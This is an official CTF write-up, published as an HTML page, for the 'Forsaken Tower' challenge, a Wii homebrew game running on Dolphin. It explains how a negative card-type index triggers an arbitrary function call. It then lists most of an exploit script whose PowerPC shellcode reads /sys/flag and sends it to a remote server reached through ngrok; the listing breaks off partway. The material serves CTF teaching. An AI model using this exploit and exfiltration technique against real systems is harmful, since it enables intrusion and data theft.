@@ -1,0 +1,442 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-dxom2xcl> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon-dark.svg" media="(prefers-color-scheme: light)"><link rel="icon" type="image/svg+xml" href="/favicon.svg" media="(prefers-color-scheme: dark)"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://localhost:3000/writeups/2025-07-20-forsaken-tower/"><!-- Primary Meta Tags --><title>ToH CTF 2025 - Forsaken Tower</title><meta name="title" content="ToH CTF 2025 - Forsaken Tower"><meta name="description" content="Official writeup for the ToH CTF 2025 challenge &#34;Forsaken Tower&#34;"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://localhost:3000/writeups/2025-07-20-forsaken-tower/"><meta property="og:title" content="ToH CTF 2025 - Forsaken Tower"><meta property="og:description" content="Official writeup for the ToH CTF 2025 challenge &#34;Forsaken Tower&#34;"><meta property="og:image" content="https://localhost:3000/writeups/2025-07-20-forsaken-tower/preview.webp"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://localhost:3000/writeups/2025-07-20-forsaken-tower/"><meta property="twitter:title" content="ToH CTF 2025 - Forsaken Tower"><meta property="twitter:description" content="Official writeup for the ToH CTF 2025 challenge &#34;Forsaken Tower&#34;"><meta property="twitter:image" content="https://localhost:3000/preview.webp"><style>:root{--accent: #fea819;--accent-dark: #ac7010;--accent-dark-010: #ac70100a}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-regular.woff) format("woff");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Atkinson;src:url(/fonts/atkinson-bold.woff) format("woff");font-weight:700;font-style:normal;font-display:swap}body{font-family:Atkinson,sans-serif;margin:0;padding:0;text-align:left;background:#171717 no-repeat;background-size:100% 600px;word-wrap:break-word;overflow-wrap:break-word;color:#aaa;font-size:20px;line-height:1.25}main{width:720px;max-width:calc(100% - 2em);margin:auto;padding:3em 1em}h1,h2,h3,h4,h5,h6{margin:1em 0 .5rem;color:#fff;line-height:1.2}h1{font-size:3.052em}h2{font-size:2.441em}h3{font-size:1.953em}h4{font-size:1.563em}h5{font-size:1.25em}strong,b{font-weight:700}a,a:hover{color:var(--accent)}p{margin-bottom:1em}textarea{width:100%;font-size:16px}input{font-size:16px}table{width:100%}img{max-width:100%;height:auto;border-radius:8px}code{padding:0 .3em;background-color:#1f1f1f;border-radius:.2em;font-size:.8em}pre{padding:1em;border-radius:.2em}pre>code{all:unset;font-size:.8em}blockquote{border-left:4px solid var(--accent);padding:.01em 0 .01em 1em;margin:0;background-color:var(--accent-dark-010)}hr{border:none;border-top:1px solid #e9e9e9}@media (max-width: 720px){body{font-size:18px}main{padding:1em}}.sr-only{border:0;padding:0;margin:0;position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);clip-path:inset(50%);white-space:nowrap}table{border-collapse:collapse;text-align:center}tr{border:1px solid #e9e9e9}th,td{padding:.5em;text-align:center}th{background-color:#1f1f1f;color:#fff}td{background-color:#1b1b1b}a[data-astro-cid-eimmu3lg]{display:inline-block;text-decoration:none}a[data-astro-cid-eimmu3lg].active{font-weight:bolder;text-decoration:underline}header[data-astro-cid-3ef6ksr2]{margin:0;padding:0 1em;background:#1f1f1f;box-shadow:0 2px 8px rgba(var(--black),5%)}h2[data-astro-cid-3ef6ksr2]{margin:0;font-size:1em}h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2],h2[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none}nav[data-astro-cid-3ef6ksr2]{display:flex;align-items:center;justify-content:space-between}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{padding:1em .5em;color:var(--black);border-bottom:4px solid transparent;text-decoration:none}nav[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2].active{text-decoration:none;border-bottom-color:var(--accent)}.social-links[data-astro-cid-3ef6ksr2],.social-links[data-astro-cid-3ef6ksr2] a[data-astro-cid-3ef6ksr2]{display:flex}@media (max-width: 720px){.social-links[data-astro-cid-3ef6ksr2]{display:none}}footer[data-astro-cid-sz7xmlte]{padding:2em 1em 6em;background:linear-gradient(var(--gray-gradient)) no-repeat;color:rgb(var(--gray));text-align:center}.social-links[data-astro-cid-sz7xmlte]{display:flex;justify-content:center;gap:1em;margin-top:1em}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{text-decoration:none;color:rgb(var(--gray))}.social-links[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:rgb(var(--gray-dark))}
+@media (prefers-color-scheme: dark){.markdown-alert{--color-border-default: #30363d;--color-accent-fg: #58a6ff;--color-accent-emphasis: #1f6feb;--color-danger-fg: #f85149;--color-danger-emphasis: #da3633;--color-attention-fg: #d29922;--color-attention-emphasis: #9e6a03;--color-done-fg: #a371f7;--color-done-emphasis: #8957e5;--color-success-fg: #3fb950;--color-success-emphasis: #238636}}@media (prefers-color-scheme: light){.markdown-alert{--color-border-default: #d0d7de;--color-accent-fg: #0969da;--color-accent-emphasis: #0969da;--color-danger-fg: #d1242f;--color-danger-emphasis: #cf222e;--color-attention-fg: #9a6700;--color-attention-emphasis: #9a6700;--color-done-fg: #8250df;--color-done-emphasis: #8250df;--color-success-fg: #1a7f37;--color-success-emphasis: #1f883d}}.markdown-alert{border-left:.25em solid var(--borderColor-default, var(--color-border-default));color:inherit;margin-bottom:16px;padding:.5rem 1em}.markdown-alert>:last-child{margin-bottom:0!important}.markdown-alert .markdown-alert-title{align-items:center;display:flex;font-size:14px;font-weight:500;line-height:1}.markdown-alert .markdown-alert-title svg.octicon{margin-right:8px!important;margin-right:var(--base-size-8,8px)!important;fill:currentColor}.markdown-alert.markdown-alert-note{border-left-color:var(--borderColor-accent-emphasis,var(--color-accent-emphasis))}.markdown-alert.markdown-alert-note .markdown-alert-title{color:var(--color-accent-fg);color:var(--fgColor-accent,var(--color-accent-fg))}.markdown-alert.markdown-alert-tip{border-left-color:var(--borderColor-success-emphasis,var(--color-success-emphasis))}.markdown-alert.markdown-alert-tip .markdown-alert-title{color:var(--color-success-fg);color:var(--fgColor-success,var(--color-success-fg))}.markdown-alert.markdown-alert-important{border-left-color:var(--borderColor-done-emphasis,var(--color-done-emphasis))}.markdown-alert.markdown-alert-important .markdown-alert-title{color:var(--color-done-fg);color:var(--fgColor-done,var(--color-done-fg))}.markdown-alert.markdown-alert-warning{border-left-color:var(--borderColor-attention-emphasis,var(--color-attention-emphasis))}.markdown-alert.markdown-alert-warning .markdown-alert-title{color:var(--color-attention-fg);color:var(--fgColor-attention,var(--color-attention-fg))}.markdown-alert.markdown-alert-caution{border-left-color:var(--borderColor-danger-emphasis,var(--color-danger-emphasis))}.markdown-alert.markdown-alert-caution .markdown-alert-title{color:var(--color-danger-fg);color:var(--fgColor-danger,var(--color-danger-fg))}main[data-astro-cid-dxom2xcl]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-dxom2xcl]{width:100%}.hero-image[data-astro-cid-dxom2xcl] img[data-astro-cid-dxom2xcl]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-dxom2xcl]{width:75%;max-width:calc(100% - 2em);margin:auto;padding:1em;color:rgb(var(--gray-dark))}.title[data-astro-cid-dxom2xcl]{margin-bottom:1em;padding:1em 0;text-align:center;line-height:1}.title[data-astro-cid-dxom2xcl] h1[data-astro-cid-dxom2xcl]{margin:0 0 .5em}.date[data-astro-cid-dxom2xcl]{margin-bottom:.5em;color:rgb(var(--gray))}.last-updated-on[data-astro-cid-dxom2xcl]{font-style:italic}
+</style></head> <body data-astro-cid-dxom2xcl> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <a href="/" style="padding: 1rem 0 0 0;" data-astro-cid-3ef6ksr2> <img src="/new_tower_logo.png" alt="Tower of Hanoi Logo" width="50rem" height="50rem" style="border-radius: 0;" data-astro-cid-3ef6ksr2> </a> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/blog" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blogposts </a>  <a href="/writeups" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Writeups </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  </div> <div class="social-links" data-astro-cid-3ef6ksr2> <a href="https://x.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Follow Tower of Hanoi on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://github.com/towerofhanoi" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" data-astro-cid-3ef6ksr2><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-3ef6ksr2></path></svg> </a> <a href="https://ctftime.org/team/300" target="_blank" data-astro-cid-3ef6ksr2> <span class="sr-only" data-astro-cid-3ef6ksr2>Go to Tower of Hanoi's CTF Time page</span> <svg viewBox="0 0 16 16" width="32" height="32" data-astro-cid-3ef6ksr2> <path fill="currentColor" d="M 0,0 H 16 V 16 H 0 L 4.7205698,7.7838485 Z" data-astro-cid-3ef6ksr2></path> </svg> </a> </div> </nav> </header>  <main data-astro-cid-dxom2xcl> <article data-astro-cid-dxom2xcl> <div class="hero-image" data-astro-cid-dxom2xcl> <img width="720" height="360" src="/writeup_images/forsaken.png" alt="" data-astro-cid-dxom2xcl> </div> <div class="prose" data-astro-cid-dxom2xcl> <div class="title" data-astro-cid-dxom2xcl> <div class="date" data-astro-cid-dxom2xcl> <time datetime="2025-07-20T16:00:00.000Z"> Jul 20, 2025 </time>  </div> <h1 data-astro-cid-dxom2xcl>ToH CTF 2025 - Forsaken Tower</h1> <h3 data-astro-cid-dxom2xcl> by Frank01001</h3> <hr data-astro-cid-dxom2xcl> </div>  <p><img src="/writeup_files/forsaken-tower/box_art.jpeg" alt="BoxArt"></p>
+<blockquote>
+<p>Hey, my cousin lent me this Wii game we used to play together when we were kids. It was really cool because the developers also sold custom SD cards with additional cards to be added to the game. Man those were the days. Anyway I heard on Reddit that you can use it to install the Homebrew Channel. Anyone know how to do that?
+<br><br>Author: Frank01001<br><br><strong>Goal</strong>: get the contents of <code>/sys/flag</code> in system NAND<br><strong>Remote</strong>: Dolphin 2506a emulator on Linux. The build has been patched to enable the use of networking in TAS (so you can provide us input). The patch is included in the attachments.<br><br>You are advised to use the same build on the same OS to avoid problems. Dolphin networking may encounter some issues on Windows. The web server used by the game in localhost is provided in the attachments as a “dummy” server that the game could have used in its intended functionality, but has not bearing on the challenge.</p>
+</blockquote>
+<blockquote>
+<p>Note: The writeup is written for a slightly older build of the challenge, however the only difference in the exploit is with the addresses used in the shellcode, which can be easily adapted to the new version. The game code is the same, so the exploit logic remains unchanged. To avoid further changes of addresses and allow remote reliability.</p>
+</blockquote>
+<p>Special thanks to <a href="https://github.com/danmaam">danmaam</a> for handling the cursed remote deployment of the challenge. The process of deployment deserved its own writeup, which you can find <a href="/blog/2025-07-20-forsaken-tower-deployment">here</a>.</p>
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p>The challenge is a Wii homebrew game in ELF format (I had some compassion and scrapped the idea of giving the DOL format). All symbols are there, so there isn’t much reversing to do, except getting acquainted with the codebase. The game has a splash screen and a menu, where you can download cards from the official servers (not hosted remotely, they are irrelevant to the challenge) or load ones from the SD card. We are also told the game runs on Dolphin 2506a and that the flag is in system NAND at <code>/sys/flag</code>.</p>
+<p>When examining the code that updates the card info on the UI after selecting a different card, you can see an issue with how the card type is handled.</p>
+<p><img src="/writeup_files/forsaken-tower/vulnplace.png" alt="vuln"></p>
+<p>The card type (a <strong>signed int</strong>) is checked for values greater than the maximum type defined in the type enum, but not for negative values. The type’s value is used as a pseudo-jump table index to call the appropriate function for rendering each card type. Therefore, passing a negative value will result in calling an undefined function, potentially an arbitrary function call.</p>
+<h3 id="the-card-file-format">The Card File Format</h3>
+<p>With minimal reverse engineering of the ROM, you can reconstruct the file format used for game cards.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Offset</th><th>Description</th></tr></thead><tbody><tr><td>0x00-0x06</td><td>Magic (ASCII of <code>FTCARD</code>)</td></tr><tr><td>0x06-0x08</td><td>ID (unsigned short)</td></tr><tr><td>0x08-0x0c</td><td>Size of JPEG image content (unsigned int)</td></tr><tr><td>0x0c-0x10</td><td>Offset of JPEG image in the file (unsigned int)</td></tr><tr><td>0x10-0x11</td><td>Card type number (0 for monster, 1 for spell, 2 for trap)</td></tr><tr><td>0x11-0x14</td><td>Zero padding</td></tr><tr><td>0x14-0x16</td><td>Attack value (unsigned short)</td></tr><tr><td>0x16-0x18</td><td>Defense value (unsigned short)</td></tr><tr><td>0x18-…</td><td>Name (null terminated string)</td></tr><tr><td>…</td><td>Description (right after Name, null terminated)</td></tr><tr><td>[JPEG offset]</td><td>JPEG content (size defined at 0x08-0x0c)</td></tr></tbody></table>
+<p>All numbers are Big-Endian, since the Wii’s Broadway CPU is PPC32 Big-Endian. The card ID is used to identify the card in the game, and the JPEG image is used as the card’s visual representation. The name and description are null-terminated strings that provide additional information about the card.</p>
+<p>Given the structure of the file format, we have plenty of space to store the shellcode and every string required by the exploit, including the URL to send the flag to.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The game runs on Dolphin, where the file access control model is ignored and every file in NAND is readable and writable. Also, by exploring the game code a bit, we can locate interesting library functions and utilities, specifically:</p>
+<ul>
+<li><code>ISFS_Open</code> and <code>ISFS_Read</code> functions, included from <code>libogc</code>, which allow file system access.</li>
+<li><code>make_request</code>, which the game uses to download cards from the official game servers. The function takes a bare URL (without scheme), a port, content pointer and size.</li>
+</ul>
+<p>Reusing this code, we can significantly simplify the exploit, which consists of a PowerPC 32 Big-Endian shellcode that:</p>
+<ol>
+<li>Opens the file <code>/sys/flag</code> using <code>ISFS_Open</code>.</li>
+<li>Reads the file into a buffer using <code>ISFS_Read</code>.</li>
+<li>Calls <code>make_request</code> with the buffer to send the flag to a remote server.</li>
+</ol>
+<p>You can debug the exploit by running Dolphin with <code>--debugger</code> from command line. Here, you can also disable the JIT engine if you need to, or clean up its cache. JIT cache is definitely something you have to be careful with, as it can lead to unexpected behavior when debugging.</p>
+<h3 id="debugging-setup">Debugging Setup</h3>
+<blockquote>
+<p>Reminder: The code and stack addresses in the following sections refer to the older build of the challenge.</p>
+</blockquote>
+<p>For the purposes of debugging, it’s handy to put a breakpoint at <code>0x8000B618</code>, the instruction in <code>_setCardInfo</code> which fetches the correct function pointer from the array on the stack. The next instructions will call the retrieved pointer to handle the UI setup for the corresponding card type.</p>
+<p><img src="/writeup_files/forsaken-tower/debugger.png" alt="debugger"></p>
+<h3 id="calling-convention">Calling Convention</h3>
+<p>Before continuing, it is useful to know some relevant aspects of the PowerPC calling convention, so that we can better understand what is going on in the code.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Register(s)</th><th>Purpose</th><th>Category</th></tr></thead><tbody><tr><td><strong>r0</strong></td><td>Used in function prologues as a temporary register</td><td>Volatile</td></tr><tr><td><strong>r1</strong></td><td>Stack pointer (SP), points to current frame’s back-chain word</td><td>Dedicated</td></tr><tr><td><strong>r2</strong></td><td>Table of Contents pointer (TOC) for PIC/global data access</td><td>Dedicated</td></tr><tr><td><strong>r3</strong></td><td>1st integer/pointer argument; also holds 1st return value</td><td>Volatile</td></tr><tr><td><strong>r4</strong></td><td>2nd integer/pointer argument; also holds 2nd return value</td><td>Volatile</td></tr><tr><td><strong>r5</strong></td><td>3rd integer/pointer argument</td><td>Volatile</td></tr><tr><td>…</td><td></td><td></td></tr><tr><td><strong>r10</strong></td><td>8th integer/pointer argument</td><td>Volatile</td></tr><tr><td><strong>r14–r31</strong></td><td>General‐purpose nonvolatile registers (callee‐saved)</td><td>Nonvolatile</td></tr><tr><td><strong>FPR0</strong></td><td>Scratch floating-point register</td><td>Volatile</td></tr><tr><td><strong>FPR1</strong></td><td>1st floating-point argument; also holds 1st FP return value</td><td>Volatile</td></tr><tr><td><strong>FPR2</strong></td><td>2nd floating-point argument; also part of multi-regs FP return</td><td>Volatile</td></tr><tr><td><strong>FPR3–FPR13</strong></td><td>3rd–13th floating-point arguments</td><td>Volatile</td></tr><tr><td><strong>FPR14–FPR31</strong></td><td>Floating-point nonvolatile registers (callee-saved)</td><td>Nonvolatile</td></tr><tr><td><strong>LR (Link Register)</strong></td><td>Holds return address for subroutine calls</td><td>Special</td></tr><tr><td><strong>CTR (Count Register)</strong></td><td>Alternate branch/loop target register</td><td>Special</td></tr></tbody></table>
+<p>Knowing that r1 is used as the stack pointer, we can check out the state of the stack when hitting the breakpoint. The stack pointer is at <code>0x808626d0</code>. From IDA, we gathered that the table of function calls is at <code>sp+108h</code>. Luckly for us, our array of function pointers is right after the temporary buffer where the card description is placed.</p>
+<p><img src="/writeup_files/forsaken-tower/stack.png" alt="stack"></p>
+<p>In the figure, the brown pointer is that of the <code>setMonsterCardInfo</code> function. After that, <code>setSpellCardInfo</code>, <code>setTrapCardInfo</code>, and <code>unknownCardTypeInfo</code> follow in cyan, purple, and grey. If you put a pointer to your shellcode in the card’s description, you can line it up so a negative type value jumps straight to it.</p>
+<p>To simplify the inclusion of required strings, we can use a second crafted card with the path to the flag and the url of the endpoint where we want the flag to be sent (I used <a href="https://ngrok.com/">ngrok</a> for simplicity). The game loads cards in alphabetical order, so we can control where each card data will end up in memory.</p>
+<p><img src="/writeup_files/forsaken-tower/other_card.png" alt="othercard"></p>
+<p>To copy the name and description from a card, the game uses <a href="https://man7.org/linux/man-pages/man3/strncpy.3p.html"><code>strncpy</code></a>. Therefore, our shellcode must contain no null bytes (or rely on the dirty buffer used to load the original file, a risky option). For improved reliability, my shellcode contains no null bytes.</p>
+<p><img src="/writeup_files/forsaken-tower/strncpy.png" alt="strncpy"></p>
+<p>Making a mistake in the exploit is pretty noticeable, as the game will crash with an exception containing the general purpose register values and the the call stack trace.
+<img src="/writeup_files/forsaken-tower/ded.png" alt="ded"></p>
+<p>The following are the scripts used to generate the cards, in this case we include addresses from the latest build of the game, which is the one you will find in the attachments. The first script generates the shellcode, while the second one generates the two cards:</p>
+<p>exploit.py</p>
+<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="py"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> keystone </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> Ks</span><span style="color:#666666">,</span><span style="color:#C99076"> KS_ARCH_PPC</span><span style="color:#666666">,</span><span style="color:#C99076"> KS_MODE_PPC32</span><span style="color:#666666">,</span><span style="color:#C99076"> KS_MODE_BIG_ENDIAN</span></span>
+<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> colorama </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> Fore</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> Style</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> init </span><span style="color:#4D9375">as</span><span style="color:#DBD7CAEE"> colorama_init</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># ---------- Wii IOS symbols ----------</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Old Addresses</span></span>
+<span class="line"><span style="color:#758575DD"># ISFS_Open     = 0x80107DE0</span></span>
+<span class="line"><span style="color:#758575DD"># ISFS_Read     = 0x80107ED0</span></span>
+<span class="line"><span style="color:#758575DD"># make_request  = 0x8000C9AC</span></span>
+<span class="line"><span style="color:#C99076">ISFS_Open</span><span style="color:#666666">     =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80107DE4</span></span>
+<span class="line"><span style="color:#C99076">ISFS_Read</span><span style="color:#666666">     =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80107ED4</span></span>
+<span class="line"><span style="color:#DBD7CAEE">make_request  </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">8000C974</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># ---------- Data locations ------------</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># Old Addresses</span></span>
+<span class="line"><span style="color:#758575DD"># Get the new ones inside the Docker</span></span>
+<span class="line"><span style="color:#C99076">PATH_LOCATION</span><span style="color:#666666">   =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">90799718</span></span>
+<span class="line"><span style="color:#C99076">URL_LOCATION</span><span style="color:#666666">    =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">90799722</span></span>
+<span class="line"><span style="color:#C99076">READ_BUFFER</span><span style="color:#666666">     =</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">90799760</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C99076">PORT</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 13179</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#758575DD"># ---------- Helpers -------------------</span></span>
+<span class="line"><span style="color:#DBD7CAEE">h16 </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> v</span><span style="color:#666666">:</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">v </span><span style="color:#CB7676">>></span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span></span>
+<span class="line"><span style="color:#DBD7CAEE">l16 </span><span style="color:#666666">=</span><span style="color:#CB7676"> lambda</span><span style="color:#DBD7CAEE"> v</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">  v        </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">FFFF</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#DBD7CAEE">asm_source </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"""</span></span>
+<span class="line"><span style="color:#C98A7D">        addis 3, 0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">PATH_LOCATION</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   3, 3, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">PATH_LOCATION</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        xor   4, 4, 4        # clear r4</span></span>
+<span class="line"><span style="color:#C98A7D">        # We just need 1 in r4, but we can't use null bytes</span></span>
+<span class="line"><span style="color:#C98A7D">        addi  4, 4, 0x101</span></span>
+<span class="line"><span style="color:#C98A7D">        andi.   4, 4, 0xf0ff</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        addis 12, 0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">ISFS_Open</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   12,12, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">ISFS_Open</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        mtctr 12</span></span>
+<span class="line"><span style="color:#C98A7D">        bctrl</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        or    31,3,3</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        or    3,31,31</span></span>
+<span class="line"><span style="color:#C98A7D">        addis 4, 0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">READ_BUFFER</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   4, 4, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">READ_BUFFER</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        xor   5, 5, 5        # clear r5</span></span>
+<span class="line"><span style="color:#C98A7D">        addi  5, 5, 0x101</span></span>
+<span class="line"><span style="color:#C98A7D">        andi.   5, 5, 0xfff0</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        addis 12,0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">ISFS_Read</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   12,12,0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">ISFS_Read</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        mtctr 12</span></span>
+<span class="line"><span style="color:#C98A7D">        bctrl</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C98A7D">        addis 3, 0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">URL_LOCATION</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        ori   3, 3, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">l16</span><span style="color:#666666">(</span><span style="color:#C99076">URL_LOCATION</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        xor  4, 4, 4        # clear r4</span></span>
+<span class="line"><span style="color:#C98A7D">        xor 4, 4, 4        # clear r4</span></span>
+<span class="line"><span style="color:#C98A7D">        addi  4, 4, 0x</span><span style="color:#C99076">{PORT</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
+<span class="line"><span style="color:#C98A7D">        addis 5, 0, 0x</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">h16</span><span style="color:#666666">(</span><span style="color:#C99076">READ_BUFFER</span><span style="color:#666666">)</span><span style="color:#CB7676">:04x</span><span style="color:#C99076">}</span></span>
